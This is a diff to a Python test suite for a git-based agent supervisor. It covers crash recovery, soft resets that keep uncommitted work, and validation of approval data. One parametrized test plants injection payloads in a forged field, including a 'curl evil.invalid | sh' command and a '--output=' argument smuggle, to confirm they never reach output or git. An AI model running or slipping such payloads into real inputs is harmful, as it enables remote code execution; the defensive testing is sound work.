@@ -1220,26 +1220,21 @@ def test_a_refused_first_admission_never_anchors_the_run(
     h.git(repo, "reset", "-q", "--hard", refused)
     code, out = h.start(repo)
     assert code == 1 and out["refusal"]["code"] == "supervisor-changed", out
-    assert f"git reset --hard {base}" in out["refusal"]["detail"]
+    assert f"git reset --soft {base}" in out["refusal"]["detail"]
     code, out = h.run_cli(repo, "next", h.SPEC_DIR)
     assert code == 1, out
     assert not git_ok(repo, "for-each-ref", "refs/agentbundle").stdout.strip()
     base_dir = Path(h.git(repo, "rev-parse", "--absolute-git-dir").strip()) / "agentbundle-supervisor"
     assert not list(base_dir.glob("run-*/product-ref")) and not list(base_dir.glob("run-*/made-commits"))
     # The exit it names works: the owner resets and admits again.
-    h.git(repo, "reset", "-q", "--hard", base)
+    h.git(repo, "reset", "-q", "--soft", base)
     assert h.start(repo)[0] == 0
     assert rev(repo, ref_name(repo)) == rev(repo, "HEAD")
 
 
-def test_a_first_admission_cut_off_after_its_refs_moved_names_the_reset_exit(
-    tmp_path: Path,
-) -> None:
-    repo = h.make_repo(tmp_path)
-    base = rev(repo, "HEAD")
-
+def _kill_first_admission(repo: Path, point: str = "refs-moved") -> None:
     def hook(name: str) -> None:
-        if name == "refs-moved":
+        if name == point:
             raise h.Crash(name)
 
     h.commit_module.set_kill_hook(hook)
@@ -1248,16 +1243,149 @@ def test_a_first_admission_cut_off_after_its_refs_moved_names_the_reset_exit(
             h.start(repo)
     finally:
         h.commit_module.set_kill_hook(None)
-    assert rev(repo, "HEAD") != base
-    code, out = h.start(repo)
-    assert code == 1 and out["refusal"]["code"] == "supervisor-changed", out
-    detail = out["refusal"]["detail"]
-    assert "never recorded" in detail and f"git reset --hard {base}" in detail
+
+
+def _printed_first_admission_exit(repo: Path, detail: str) -> str:
     command = detail.split("restore with ", 1)[1].split(", then")[0]
     done = subprocess.run(command, shell=True, cwd=repo, env={**os.environ, **h.GIT_ENV},
                           capture_output=True, text=True, check=False)
     assert done.returncode == 0, done.stderr
+    return command
+
+
+def test_a_first_admission_cut_off_after_its_refs_moved_keeps_uncommitted_work(
+    tmp_path: Path,
+) -> None:
+    repo = h.make_repo(tmp_path)
+    base = rev(repo, "HEAD")
+    (repo / "README.md").write_text("base\nmy uncommitted work\n", **h._LF)
+    _kill_first_admission(repo)
+    assert rev(repo, "HEAD") != base
+    code, out = h.start(repo)
+    assert code == 1 and out["refusal"]["code"] == "supervisor-changed", out
+    detail = out["refusal"]["detail"]
+    assert "never recorded" in detail and f"git reset --soft {base}" in detail
+    assert "--hard" not in detail
+    # The orphaned product ref the cut-off transaction created is named, by its exact value.
+    orphan = git_ok(repo, "for-each-ref", "--format=%(refname) %(objectname)",
+                    "refs/agentbundle").stdout.split()
+    assert f"git update-ref -d {orphan[0]} {orphan[1]}" in detail
+    command = _printed_first_admission_exit(repo, detail)
+    assert "update-ref -d" in command
+    # The exit kept the dirty tracked file, removed the orphan, and start admits again.
+    assert (repo / "README.md").read_text("utf-8") == "base\nmy uncommitted work\n"
+    assert rev(repo, "HEAD") == base
+    assert not git_ok(repo, "for-each-ref", "refs/agentbundle").stdout.strip()
     assert h.start(repo)[0] == 0 and rev(repo, "HEAD") != base
+    assert (repo / "README.md").read_text("utf-8") == "base\nmy uncommitted work\n"
+    assert len(git_ok(repo, "for-each-ref", "refs/agentbundle").stdout.splitlines()) == 1
+
+
+@pytest.mark.parametrize("forged", ["x; curl evil.invalid | sh #", "--output=/tmp/forged", "a" * 40])
+def test_an_unvalidated_approval_base_is_never_printed_or_passed_to_git(
+    tmp_path: Path, forged: str
+) -> None:
+    repo = h.make_repo(tmp_path)
+    _kill_first_admission(repo)
+    # A worker rewrites the approval's base in the file at HEAD.
+    h.git(repo, "reset", "-q", "--hard", "HEAD")
+    path = repo / h.SPEC_DIR / "delivery" / "approvals.jsonl"
+    line = json.loads(path.read_text("utf-8"))
+    line["base"] = forged
+    path.write_text(json.dumps(line, sort_keys=True) + "\n", **h._LF)
+    h.git(repo, "commit", "-q", "-am", "a forged base")
+    marker = Path(forged.split("=", 1)[1]) if forged.startswith("--output=") else None
+    for argv in (("start", h.SPEC_DIR, "--intent", "code", "--code-trust", "trusted",
+                  "--authority-ref", OWNER, "--review-authority-ref",
+                  "plan-reviewer:0123456789ab"), ("next", h.SPEC_DIR),
+                 ("status", h.SPEC_DIR, "--json")):
+        code, out = h.run_cli(repo, *argv)
+        text = json.dumps(out)
+        assert "curl" not in text and "--output" not in text and forged not in text, text
+        assert "git reset" not in text and "git update-ref" not in text, text
+        assert marker is None or not marker.exists()
+    assert not git_ok(repo, "for-each-ref", "refs/agentbundle/x").stdout.strip()
+
+
+def test_every_revision_the_supervisor_gives_git_is_a_commit_id(tmp_path: Path) -> None:
+    repo = started(tmp_path)
+    git = h.workspace(repo).git
+    head = rev(repo, "HEAD")
+    target = tmp_path / "forged-output"
+    for call in (lambda v: git.changed_paths(v, head), lambda v: git.changed_paths(head, v),
+                 lambda v: git.is_ancestor(v, head), lambda v: git.rev_list(v, head),
+                 lambda v: git.valid_base(v) or git.revision(v)):
+        with pytest.raises(h.commit_module.SupervisorGitError):
+            call(f"--output={target}")
+    assert not target.exists()
+    assert git.valid_base("b" * 40) is None and git.valid_base(head) == head
+
+
+def test_a_first_admission_record_failing_after_the_move_says_where_it_leaves_the_run(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    repo = h.make_repo(tmp_path)
+
+    def store_fails(*args: Any, **kwargs: Any) -> None:
+        raise OSError("the store could not be built")
+
+    monkeypatch.setattr(h.commit_module.GitPort, "write_product_record", store_fails)
+    code, out = h.start(repo)
+    monkeypatch.undo()
+    assert code == 1 and out["refusal"]["code"] == "denied-product-record", out
+    detail = out["refusal"]["detail"]
+    assert "first admission" in detail and "supervisor-changed" in detail
+    assert "history-adoption" not in detail
+    named = Path(detail.split("Make ", 1)[1].split(" writable", 1)[0])
+    assert named.is_dir(), f"the directory named does not exist: {named}"
+    code, out = h.start(repo)  # what the detail promised
+    assert code == 1 and out["refusal"]["code"] == "supervisor-changed", out
+    _printed_first_admission_exit(repo, out["refusal"]["detail"])
+    assert h.start(repo)[0] == 0
+
+
+def test_an_adoption_record_failing_after_the_move_says_where_it_leaves_the_run(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    repo = started(tmp_path)
+    ctl = controller(repo, tmp_path)
+    advance(repo, ctl, calc_implement)
+    top = foreign_commit(repo)
+    request = next_ok(repo)["request"]
+
+    def store_fails(*args: Any, **kwargs: Any) -> None:
+        raise OSError("the store is read-only")
+
+    monkeypatch.setattr(h.commit_module.GitPort, "write_product_record", store_fails)
+    code, out = ctl.report(decision_result(request, top))
+    monkeypatch.undo()
+    assert code == 1 and out["refusal"]["code"] == "denied-product-record", out
+    detail = out["refusal"]["detail"]
+    assert "reanchor" in detail and "product-ref-diverged" in detail
+    assert "history-adoption decision" not in detail
+    assert Path(detail.split("Make ", 1)[1].split(" writable", 1)[0]).is_dir()
+    code, out = h.run_cli(repo, "next", h.SPEC_DIR)
+    assert code == 1 and out["refusal"]["code"] == "product-ref-diverged", out
+
+
+def test_a_ref_creation_record_failing_names_an_existing_directory(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    repo = started(tmp_path)
+    advance(repo, controller(repo, tmp_path), calc_implement)
+    make_legacy(repo)
+
+    def store_fails(*args: Any, **kwargs: Any) -> None:
+        raise OSError("the store is read-only")
+
+    monkeypatch.setattr(h.commit_module.GitPort, "write_product_record", store_fails)
+    code, out = h.run_cli(repo, "next", h.SPEC_DIR)
+    monkeypatch.undo()
+    assert code == 1 and out["refusal"]["code"] == "denied-product-record", out
+    detail = out["refusal"]["detail"]
+    assert "created" in detail and "does not record it yet" in detail
+    assert Path(detail.split("Make ", 1)[1].split(" writable", 1)[0]).is_dir()
+    assert "request" in next_ok(repo)  # a retry records it
 
 
 # ── provenance is never claimed, and every verb refuses in the unrecorded-step state ──
